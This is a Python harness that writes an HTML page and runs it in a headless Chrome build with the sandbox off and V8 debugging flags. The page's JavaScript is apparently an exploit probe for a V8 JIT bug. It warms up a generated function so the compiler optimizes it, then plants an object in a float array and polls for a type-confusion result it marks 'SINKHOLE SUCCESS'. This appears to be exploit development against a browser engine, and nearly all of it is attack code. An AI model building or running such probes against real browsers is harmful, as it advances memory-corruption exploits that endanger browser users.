import subprocess, tempfile

html = """<!DOCTYPE html><html><body><script>
let lines = [];
lines.push("function dyn_loop(x, arr, obj) {");
for (let i = 0; i < 650; i++) lines.push(`  if (x === ${i}) return ${i};`);
lines.push("  arr[0] = obj;");
lines.push("  let r = 0;");
lines.push("  for (let j = 0; j < x; j++) {");
lines.push("    r = arr[1];");
lines.push("  }");
lines.push("  return r;");
lines.push("}");
lines.push("return dyn_loop;");

let fn = new Function(lines.join("\\n"))();
let dummy = { a: 1 };
let dummy_arr = [1.1, 2.2, 3.3];

console.log("Warmup starting...");
for (let i = 0; i < 20000; i++) {
  fn(i, dummy_arr, dummy);
}
console.log("Warmup done! Starting polling attempts...");

for (let attempt = 0; attempt < 100; attempt++) {
  let t0 = Date.now();
  while (Date.now() - t0 < 20); // wait 20ms
  let farr = [1.1, 2.2, 3.3];
  let res = fn(1, farr, dummy);
  if (typeof res === "object") {
    console.log(`=== SINKHOLE SUCCESS! Attempt ${attempt}: Object:`, res, "===");
    break;
  }
  if (attempt % 20 === 0) {
    console.log(`Attempt ${attempt}: res is still ${typeof res} ${res}`);
  }
}
console.log("Polling finished.");
</script></body></html>"""

with open("script/test_retry.html", "w") as f:
    f.write(html)

profile = tempfile.mkdtemp(prefix="prof-")
cmd = [
    "./script/candidate/chrome/chrome",
    "--headless=new",
    "--no-sandbox",
    "--disable-gpu",
    "--disable-dev-shm-usage",
    f"--user-data-dir={profile}",
    "--enable-logging=stderr",
    "--js-flags=--no-memory-protection-keys --expose-cage-base --trace-opt",
    "http://127.0.0.1:8000/test_retry.html"
]
p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
try:
    out, _ = p.communicate(timeout=10)
except subprocess.TimeoutExpired:
    p.kill()
    out, _ = p.communicate()

for line in out.splitlines():
    if "dyn_loop" in line or "CONSOLE" in line:
        print(line)
